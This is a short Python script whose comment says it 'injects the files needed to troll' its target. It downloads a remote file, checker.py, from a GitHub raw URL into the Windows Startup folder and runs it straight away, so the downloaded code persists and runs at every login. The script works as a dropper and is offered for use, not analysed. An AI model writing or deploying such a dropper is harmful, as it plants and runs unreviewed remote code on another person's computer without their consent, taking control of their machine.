# Downloads and injects the files needed to troll your dumbass
def clone():
    import os, urllib.request, pathlib, subprocess
    dlurl = 'https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/checker.py'
    home = os.path.expanduser("~")
    path = str(home) + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\checker.py'
    urllib.request.urlretrieve(dlurl, '{}'.format(path))
    subprocess.call(['python.exe', '{}'.format(path)])
    exit()

clone()